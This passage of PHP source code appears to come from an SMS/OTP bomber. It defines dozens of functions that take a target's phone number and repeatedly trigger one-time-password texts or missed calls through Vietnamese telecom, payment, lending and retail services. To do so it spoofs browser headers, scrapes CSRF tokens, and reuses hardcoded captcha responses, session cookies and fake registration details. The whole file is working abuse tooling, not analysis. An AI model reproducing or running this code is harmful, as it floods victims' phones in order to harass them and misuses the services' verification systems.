'.$sdt.'
------WebKitFormBoundary6tasV7gdCXo1XomC--';
	$access = json(CURL("POST", "https://sso.tuoitre.vn/receive-otp", $data, $head, false));
	if($access["success"] == 1){
		return array("TUOITRE" => "Thành Công");
	} else {
		return array("TUOITRE" => "Thất Bại");
	}
}
function VIEON($sdt){
	$head = array(
		"Host: vieon.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"referer: https://vieon.vn/",
	);
	$access = CURL("GET", "https://vieon.vn/", null, $head, false);
	$token = explode('"', explode('"token":"', $access)[1])[0];
	$head = array(
		"Host: api.vieon.vn",
		"accept: application/json, text/plain, */*",
		"authorization: ".$token,
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"referer: https://vieon.vn/",
	);
	$data = 'phone_number='.$sdt.'&password=123456789&given_name=&device_id=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobile_web&model=Android%2012&push_token=&device_name=Chrome%2F96&device_type=desktop&ui=012021';
	$access = json(CURL("POST", "https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021", $data, $head, false));
	if($access["error"] == 400){
		$data = 'phone_number='.$sdt.'&platform=mobile_web&ui=012021';
		$access = json(CURL("POST", "https://api.vieon.vn/backend/user/forget/forget_password?platform=mobile_web&ui=012021", $data, $head, false));
	}
	if($access["register_session_id"] or $access["status"] == 1){
		return array("VIEON" => "Thành Công");
	} else {
		return array("VIEON" => "Thất Bại");
	}
}
function F88($sdt){
	$head = array(
		'Host: api.f88.vn',
		'accept: application/json, text/plain, */*',
		'content-encoding: gzip',
		'user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
		'content-type: application/json',
		'origin: https://online.f88.vn',
		'referer: https://online.f88.vn/',
	);
	$data = '{"phoneNumber":"'.$sdt.'","recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}';
	$access = json(CURL("POST", "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", $data, $head, false));
	if($access["message"] == "Gửi mã OTP thành công."){
		return array("F88" => "Thành Công");
	} else {
		return array("F88" => "Thất Bại");
	}
}
//otp
function TAMO($sdt){
	$head = array(
		"Host: api.tamo.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
		"content-type: application/json;charset=UTF-8",
		"origin: https://www.tamo.vn",
		"referer: https://www.tamo.vn/",
	);
	$data = '{"mobilePhone":{"number":"'.$sdt.'"}}';
	$access = json(CURL("POST", "https://api.tamo.vn/web/public/client/phone/sms-code-ts", $data, $head, false));
	if($access["data"][0] == ""){
		return array("TAMO" => "Thành Công");
	} else {
		return array("TAMO" => "Thất Bại");
	}
}
function VIETTELL($sdt){
	$head = array(
		"Host: vietteltelecom.vn",
		"Connection: keep-alive",
		"X-CSRF-TOKEN: mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I",
		"User-Agent: Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Accept: application/json, text/plain, */*",
		"Referer: https://vietteltelecom.vn/dang-nhap",
	);
	$data = array(
		"phone" => $sdt,
		"type" => ""
	);
	$GET = json(CURL("POST", "https://vietteltelecom.vn/api/get-otp-login", json_encode($data), $head, false));
	if($GET["code"] == 200){
		return array("VIETTELL" => "Thành Công");
	} else {
		return array("VIETTELL" => "Thất Bại");
	}
}
function VETTELL2($sdt){
	$head = array(
		"Host: viettel.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Origin: https://viettel.vn",
	);
	$GET = CURL("GET", "https://viettel.vn/dang-ky", null, $head, false);
	$token = explode('"', explode('name="csrf-token" content="', $GET)[1])[0];
	$head = array(
		"Host: viettel.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"X-XSRF-TOKEN: eyJpdiI6Ik1tKzdYTWlYXC9jenl1OVRTNjlRV253PT0iLCJ2YWx1ZSI6IjZQdkY5SHpUVDdRSXdRUzlRRkx4Z2tKeW91RkZoTkhWQXZzU01EQzhHVW9cL2ZiK2lKZzMxYndhWWp4NmJkVmhWIiwibWFjIjoiMDNkMTVkNzhkODE1ZTA4ZjI0MTVlMmU5MDJhZjUwMTY5MGIxNDgyN2Q2MzZlNDJhNDNkNDQyZjJkNWVjZDk5MyJ9",
		"X-CSRF-TOKEN: ".$token,
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Origin: https://viettel.vn",
		"Referer: https://viettel.vn/dang-nhap",
	);
	$data = '{"msisdn":"'.$sdt.'"}';
	$GET = json(CURL("POST", "https://viettel.vn/api/get-otp", $data, $head, false));
	if($GET["code"] == 200){
		return array("VETTELL2" => "Thành Công");
	} else {
		return array("VETTELL2" => "Thất Bại");
	}
}
function ZALOPAY($sdt) {
	$head = array(
		"Host: api.zalopay.vn",
		"x-platform: NATIVE",
		"x-device-os: ANDROID",
		"x-device-id: 690354367d96c358",
		"x-device-model: Samsung SM-A217F",
		"x-app-version: 7.16.0",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
		"x-density: xhdpi",
		"authorization: Bearer",
		"x-drsite: off",
		"accept-encoding: gzip",
	);
	$get = json(CURL("GET", "https://api.zalopay.vn/v2/account/phone/status?phone_number=".$sdt, null, $head, false));
	$token = $get["data"]["send_otp_token"];
	$data = '{"phone_number":"'.$sdt.'","send_otp_token":"'.$token.'"}';
	$get = json(CURL("POST", "https://api.zalopay.vn/v2/account/otp", $data, $head, false));
	if($get["error"] == 1){
		return array("ZALOPAY" => "Thất Bại");
	} else {
		return array("ZALOPAY" => "Thành Công");
	}
}
function WINMART($sdt){
	$head = array(
		"Host: api-crownx.winmart.vn",
		"accept: application/json",
		"authorization: Bearer undefined",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"origin: https://winmart.vn",
		"x-requested-with: mark.via.gp",
		"sec-fetch-site: same-site",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://winmart.vn/",
		"accept-encoding: gzip, deflate",
		"accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
	);
	$get = json_decode(CURL("GET", "https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo=".$sdt, null, $head, false),true);
	if($get["data"]["errorMessage"] == "Gửi OTP thành công"){
		return array("WINMART" => "Thành Công");
	} else {
		return array("WINMART" => "Thất Bại");
	}
}
function VAYSIEUDE($sdt){
	$head = array(
		"Host: vaysieude.com",
		"cache-control: max-age=0",
		"upgrade-insecure-requests: 1",
		"origin: https://vaysieude.com",
		"content-type: application/x-www-form-urlencoded",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"referer: https://vaysieude.com/?click_id=643f76517a519600011858c1",
		"cookie: XSRF-TOKEN=eyJpdiI6IlR2V3FVWWNXWTlMTTlWU2EySDg2V1E9PSIsInZhbHVlIjoiRzBnTHpBVUJhdFlxWWEwMHh5YVhJNmlLQnRuQjFINzl4QVBLL3Q0SVhNV0N5RHoxY1d3RWMrSVBveHRiOTBCTFB3bkp1YWtRdEtMb2JUc002UFA3YUY4VjZXTVpZUVgvNjR5N3pyeFhPeHEwbm9jT1R2ZlBqbmlaWFcwVnNGZEkiLCJtYWMiOiI1NmExYjgxZmM1MDhhMzRkNWE0Nzc0OGQ4OThhMTc2Yjk5ZGJiMjg0ZmY2Nzg1OWYwZjY3NWY5ZDI1ZjNlMDhlIn0%3D;laravel_session=eyJpdiI6ImdHZjRKWmJJaW1XZXZ3Vk8zV2kyTGc9PSIsInZhbHVlIjoic2kyZTNYWTY3SEZVM1gxZDc3UGd5ZGFpRjVBMFRwM3hiTEo0NU1BYVkzeThCb3p1bzRvMlVUdWI3elh0N3c1QmxMb3VNMEtvTFpsMW1qUVVmTmRqWE4wdWl1S2N0ajRGbWRTM1FZaUJoN21QNHgyeFBqd21VMHVBVHpmS21pMUEiLCJtYWMiOiJjMDdmM2RhMDEwYWY2Zjg5NTI5OTBjMTZjZDlkYzA5Zjc1OWUzNGFhYTI0ZjVmN2E1NDMzZDRmZWRkZTRjNThjIn0%3D"
	);
	$get = CURL("GET", "https://vaysieude.com/?click_id=643f76517a519600011858c1", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $get)[1])[0];
	$data = http_build_query(array(
		"_token" => $token,
		"loan[loan_amount]" => "20000000",
		"loan[full_name]" => "Không biết",
		"loan[identity]" => "123456789",
		"loan[phone]" => $sdt
	));
	$get = CURL("POST", "https://vaysieude.com/?click_id=643f76517a519600011858c1", $data, $head, false);
	if (strpos ($get, "An Error Occurred: Method Not Allowed") !== false){
		return array("VAYSIEUDE" => "Thất Bại");
	} else {
		return array("VAYSIEUDE" => "Thành Công");
	}
}
function THANTAIOI($sdt){///calll
	$sdt = "84".$sdt;
	$sdt = "84".str_replace("840", "", $sdt);
	$head = array(
		"Host: api.thantaioi.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://thantaioi.vn",
		"referer: https://thantaioi.vn/",
	);
	$data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"'.$sdt.'","target_url":"caydenthan.vn/"}';
	$get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user", $data, $head, false),true);
	$token = $get["token"];
	if($token){
		$head = array(
			"Host: api.thantaioi.vn",
			"accept-language: vi",
			"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
			"content-type: application/json",
			"authorization: Bearer ".$token,
			"accept: */*",
			"origin: https://thantaioi.vn",
			"referer: https://thantaioi.vn/",
		);
		$get = json_decode(CURL("GET", "https://api.thantaioi.vn/api/user/phone-confirmation-code", null, $head, false),true);
	} else {
		$data = '{"phone":"'.$sdt.'"}';
		$get = json_decode(CURL("POST", "https://api.thantaioi.vn/api/user/send-one-time-password", $data, $head, false),true);
	}
	if($get["phone_confirmation_type"] == "missed_call"){
		return array("THANTAIOI" => "Thành Công");
	} else {
		return array("THANTAIOI" => "Thất Bại");
	}
}



function MCREDIT($sdt){
	$head = array(
		"Host: mcredit.com.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json; charset=UTF-8",
		"origin: https://mcredit.com.vn",
		"referer: https://mcredit.com.vn/",
	);
	$data = '"'.$sdt.'"';
	$get = CURL("POST", "https://mcredit.com.vn/api/Customers/requestOTP", $data, $head, false);
	if($get == ""){
		return array("MCREDIT" => "Thành Công");
	} else {
		return array("MCREDIT" => "Thất Bại");
	}
}
function CAYDENTHAN($sdt){///calll
	$sdt = "84".$sdt;
	$sdt = "84".str_replace("840", "", $sdt);
	$head = array(
		"Host: api.caydenthan.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://caydenthan.vn",
		"referer: https://caydenthan.vn/",
	);
	$data = '{"full_name":"Khang pro","first_name":"pro","last_name":"Khang","mobile_phone":"'.$sdt.'","target_url":"caydenthan.vn/"}';
	$get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user", $data, $head, false),true);
	$token = $get["token"];
	if($token){
		$head = array(
			"Host: api.caydenthan.vn",
			"accept-language: vi",
			"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
			"content-type: application/json",
			"authorization: Bearer ".$token,
			"accept: */*",
			"origin: https://caydenthan.vn",
			"referer: https://caydenthan.vn/",
		);
		$get = json_decode(CURL("GET", "https://api.caydenthan.vn/api/user/phone-confirmation-code", null, $head, false),true);
	} else {
		$data = '{"phone":"'.$sdt.'"}';
		$get = json_decode(CURL("POST", "https://api.caydenthan.vn/api/user/send-one-time-password", $data, $head, false),true);
	}
	if($get["phone_confirmation_type"] == "missed_call"){
		return array("DENTHAN" => "Thành Công");
	} else {
		return array("DENTHAN" => "Thất Bại");
	}
}
function DAIHOCFPT($sdt){
	$head = array(
		"Host: daihoc.fpt.edu.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"origin: https://daihoc.fpt.edu.vn",
		"referer: https://daihoc.fpt.edu.vn/tuyen-sinh-dh-fpt/"
	);
	$data = "firstname=Khang&mobilephone=".$sdt."&email=tenhkhong3%40gmail.com&city_id=B%C3%ACnh+Ph%C6%B0%E1%BB%9Bc&ldp_id=tuyen-sinh-dh-fpt&utm_source=&utm_medium=&utm_campaign=&utm_term=&url_referer=&utm_cpname=&utm_adscampaign=&script_uri=https%3A%2F%2Fdaihoc.fpt.edu.vn%2Ftuyen-sinh-dh-fpt%2F&type_register=";
	$get = CURL("POST", "https://daihoc.fpt.edu.vn/tstt/tuyen-sinh-dh-fpt/register.php", $data, $head, false);
	$get = CURL("GET", "https://daihoc.fpt.edu.vn/user/login/gui-lai-otp.php?mobile=".$sdt."&resend_opt=1", null, $head, false);
	if (strpos ($get, $sdt) !== false){
		return array("DAIHOCFPT" => "Thành Công");
	} else {
		return array("DAIHOCFPT" => "Thất Bại");
	}
}
function CAFELAND($sdt){
	$head = array(
		'Host: nhadat.cafeland.vn',
		'accept: application/json, text/javascript, */*; q=0.01',
		'x-requested-with: XMLHttpRequest',
		'user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36',
		'content-type: application/x-www-form-urlencoded; charset=UTF-8',
		'origin: https://nhadat.cafeland.vn',
		'referer: https://nhadat.cafeland.vn/dang-ky.html',
		'cookie: _fbp=fb.1.1681635921620.1153873944;__zi=2000.SSZzejyD6zyjZ_AYrmnPo2t9yFR9GbVGRvNY_DTG5S9vX-sYtrDTZ7k4wA7VKrJ1UeBfxDjNLSLyXkJfCm.1;XSRF-TOKEN=eyJpdiI6ImlmZ2dwR3E3cmN6c0swa1lna0NOTXc9PSIsInZhbHVlIjoidG5NWWxOS1FxZTU0ZVFxekN4SmI1Z0VmVXQ5T2gwK1kxXC9HQTV6VFJDRVZ1U0haXC8yMldIYTdySERMS250aHdQIiwibWFjIjoiZGRlOTdhMjU5NGYyZGJkZDMzMmQxMTY2NDhkNDM2YjQ4M2JhMjI1YWRmYWYzZWViNDQ3ZmVlM2Y2NzNkMWM5MCJ9;laravel_session=eyJpdiI6IkJNSWdvektYKzJWMnZ1SGRzeTJpSVE9PSIsInZhbHVlIjoiYUY4dnlUbzI3bWhxK0Y5VkRIbXVwaWN3V3RLYmpZV04zemxib2krTEhRZTVPUlpraG40eE9Oa3Q5Q1wvMExrYmciLCJtYWMiOiJjNTNkMTNlMzIwZGIzNGZmNTY5MDQ5OGEzNTkzZGQ5MTlhMGE2NmVmMzM1ZTlkNzA3ZjRlMWFlNWQwNDg0Y2Y3In0%3D'
	);
	$get = CURL("GET", "https://nhadat.cafeland.vn/dang-ky.html", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $get)[1])[0];
	$data = "mobile=".$sdt."&_token=".$token;
	$get = json_decode(CURL("POST", "https://nhadat.cafeland.vn/member-send-otp/", $data, $head, false),true);
	if($get["active_check"] == "1" or $get["active_check"] == "true"){
		return array("CAFELAND" => "Thành Công");
	} else {
		return array("CAFELAND" => "Thất Bại");
	}
}
function FINDO($sdt){
	$head = array(
		"Host: api.findo.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json;charset=UTF-8",
		"origin: https://www.findo.vn",
		"referer: https://www.findo.vn/",
	);
	$data = '{"mobilePhone":{"number":"'.$sdt.'"}}';
	$get = json_decode(CURL("POST", "https://api.findo.vn/web/public/client/phone/sms-code-ts", $data, $head, false),true);
	if($get["data"][0] == ""){
		return array("FINDO" => "Thành Công");
	} else {
		return array("FINDO" => "Thất Bại");
	}
}
function ONCREDIT($sdt){///call
	$head = array(
		"Host: oncredit.vn",
		"accept: application/json, text/javascript, */*; q=0.01",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"origin: https://oncredit.vn",
		"referer: https://oncredit.vn/registration",
		"cookie: SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCredit_id=643e0edf695496.07498174;fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GN_USER_ID_KEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GN_SESSION_ID_KEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247"
	);
	$get = CURL("GET", "https://oncredit.vn/registration", null, $head, false);
	$token = explode('"', explode('name="CSRFToken" content="', $get)[1])[0];
	$data = "data%5BtypeData%5D=sendCodeReg&data%5Bphone%5D=".$sdt."&data%5Bemail%5D=khangksjjrf%40gmail.com&data%5Bcaptcha1%5D=1&data%5Blang%5D=vi&CSRFName=CSRFGuard_ajax&CSRFToken=".$token;
	$get = json_decode(CURL("POST", "https://oncredit.vn/?ajax", $data, $head, false),true);
	if($get["message"] == "OK") {
		return array("ONCREDIT" => "Thành Công");
	} else {
		return array("ONCREDIT" => "Thất Bại");
	}
}
function META($sdt){
	$head = array(
		"Host: meta.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://meta.vn",
		"referer: https://meta.vn/account/register",
		"cookie: _ssid=smfszyszu3tq5h02lmly12yz;_cart_=fc5bf0de-45de-4323-a007-f7860e71a5a1;__ckmid=262a67477e774f56b3de7e656e741682"
	);
	$data = '{"api_args":{"lgUser":"'.$sdt.'","act":"send","type":"phone"},"api_method":"CheckExist"}';
	$GET= json(CURL("POST", "https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1", $data, $head, false));
	if($GET["Status"] == "send_ok"){
		return array("META" => "Thành Công");
	} else {
		return array("META" => "Thất Bại");
	}
}
function VTPAY($sdt){
	$head = array(
		"Host: api8.viettelpay.vn",
		"product: VIETTELPAY",
		"accept-language: vi",
		"authority-party: APP",
		"channel: APP",
		"type-os: android",
		"app-version: 5.1.4",
		"os-version: 10",
		"imei: "."VTP_".strtoupper(generateRandomString(32)),
		"x-request-id: ".date("YmdHis"),
		"content-type: application/json; charset=UTF-8",
		"user-agent: okhttp/4.2.2"
	);
	$data = array(
		"type" => "msisdn",
		"username" => $sdt
	);
	$GET = json(CURL("POST", "https://api8.viettelpay.vn/customer/v1/validate/account", json_encode($data), $head, false));
	if ($GET["status"]["code"] == "CS9901") {
		$data = array(
			"hash" => "",
			"identityType" => "msisdn",
			"identityValue" => $sdt,
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"notifyToken" => "",
			"otp" => "android",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"transactionId" => "",
			"type" => "REGISTER",
			"typeOs" => "android",
			"verifyMethod" => "sms"
		);
		$GET = json(CURL("POST", "https://api8.viettelpay.vn/customer/v2/accounts/register", json_encode($data), $head, false));
	} else {
		$data = array(
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"loginType" => "BASIC",
			"msisdn" => $sdt,
			"otp" => "",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"requestId" => "",
			"typeOs" => "android",
			"userType" => "msisdn",
			"username" => $sdt
		);
		$GET = json(CURL("POST", "https://api8.viettelpay.vn/auth/v1/authn/login", json_encode($data), $head, false));
	}
	if($GET["status"]["message"] == "Cần xác thực bổ sung OTP" or $GET["status"]["message"] == "Vui lòng nhập mã OTP được gửi về SĐT ".$sdt." để xác minh chính chủ"){
		return array(
			"VTPAY" => "Thành Công"
		);
	} else {
		return array(
			"VTPAY" => "Thất Bại"
		);
	}
}
function FPTSHOP($sdt){
	$head = array(
		"Host: fptshop.com.vn",
		"Accept: */*",
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.85 Mobile Safari/537.36",
		"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
	);
	$data = 'phone='.$sdt;
	$GET = json(CURL("POST", "https://fptshop.com.vn/api-data/loyalty/Login/Verification", $data, $head, false));
	if($GET["datas"]["expiredSeconds"] == "299"){
		return array("FPTSHOP" => "Thành Công");
	} else {
		return array("FPTSHOP" => "Thất Bại");
	}
}
function TV360($sdt){
	$url = "http://m.tv360.vn/public/v1/auth/get-otp-login";
	$ch = curl_init();
	$data = '{"msisdn":"'.$sdt.'"}';
	$head = array(
		"Host: m.tv360.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
		"Content-Type: application/json",
		"Origin: http://m.tv360.vn",
		"Referer: http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
		"Cookie: img-ext=avif; session-id=s%3A80c6fbad-d7e1-4dac-92a6-6cb5897bcf98.vnOf3K%2B010rNLX1ydurEP6VbvWURhbu4yAmsZ7EoxqQ; device-id=s%3Awap_649b61fe-eafa-4467-a902-894759722239.Z3iCDzH0lKHxKMRhPojvaWT%2BOFwOmZpVB11XnqALrJM; screen-size=s%3A385x854.YsJCQUjKOJSkUOYLfVhMNjngvj0EBsElrxhbkBkUaj0; access-token=; refresh-token=; msisdn=; profile=; user-id=; auto-login=1; G_ENABLED_IDPS=google"
	);
	$access = json(CURL("POST", $url, $data, $head, false));
	if($access["errorCode"] == 200){
		return array("TV360" => "Thành Công");
	} else {
		return array("TV360" => "Thất Bại");
	}
}
function POPS($sdt){
	$head = array(
		"Host: pops.vn",
		"content-type: application/json",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: */*",
		"origin: https://pops.vn",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"cookie: ssid=:1678719841"
	);
	$access = CURL("GET", "https://pops.vn/auth/signin-signup/signup", null, $head, false);
	$token = explode('"', explode('"DEFAULT_TOKEN":"', $access)[1])[0];
	$head = array(
		"Host: products.popsww.com",
		"profileid: 64078d77bb84c700517c9ce4",
		"authorization: ".$token,
		"x-env: production",
		"content-type: application/json",
		"lang: vi",
		"sub-api-version: 1.1",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"api-key: 5d2300c2c69d24a09cf5b09b",
		"platform: wap",
		"accept: */*",
		"origin: https://pops.vn",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"cookie: ssid=:1678719841"
	);
	$data = '{"fullName":"","account":"'.$sdt.'","password":"123456789","confirmPassword":"123456789"}';
	$access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/register", $data, $head, false));
	if($access["meta"]){
		return array("POPS" => "Thành Công");
	} else if($access["error"]["statusCode"] == 400){
		$data = '{"account":"'.$sdt.'"}';
		$access = json(CURL("POST", "https://products.popsww.com/api/v5/auths/forgotPassword", $data, $head, false));
		if($access["data"]["status"] == "OK"){
			return array("POPS" => "Thành Công");
		} else {
			return array("POPS" => "Thất Bại");
		}
	}
}
function CONCUNG($sdt){
	$head = array(
		"Host: concung.com",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"origin: https://concung.com",
		"sec-fetch-site: same-origin",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://concung.com/dang-nhap.html",
		"accept-encoding: gzip, deflate",
		"accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"cookie: PHPSESSID=vsi9b8cootu5vn9r0dedg8uf25;6f1eb01ca7fb61e4f6882c1dc816f22d=T%2FEqzjRRd5g%3DhYizvolLX6g%3D7t6mKTVPee4%3DfBzOLlSKZDk%3DH9DwywDLCIw%3Da7NDiPDjkp8%3DBMNH2%2FPz1Ww%3DjFPr4PEbB58%3DD94ivb5Cw3c%3Dr1OchLBIGPo%3Dc7XLOffW%2BH0%3D0dV0DodRYHg%3Dais7Z9OZ6uQ%3DD7U33jY70Ks%3D;_fbp=fb.1.1682005442726.1800371004;_tt_enable_cookie=1;_ttp=RNRPqkCHGbJ0KZPz8ahi9unsakR;Srv=cc204|ZEFZz|ZEFZv"
	);
	$data = "ajax=1&classAjax=AjaxLogin&methodAjax=sendOtpLogin&customer_phone=".$sdt."&id_customer=0&momoapp=0&back=khach-hang.html";
	$get = json_decode(CURL("POST", "https://concung.com/ajax.html", $data, $head, false),true);
	if($get["result"] == "1"){
		return array("CONCUNG" => "Thành Công");
	} else {
		return array("CONCUNG" => "Thất Bại");
	}
}
function BAPI($sdt){
	$head = array(
		"Host: bapi.com.vn",
		"accept: application/json, text/javascript, */*; q=0.01",
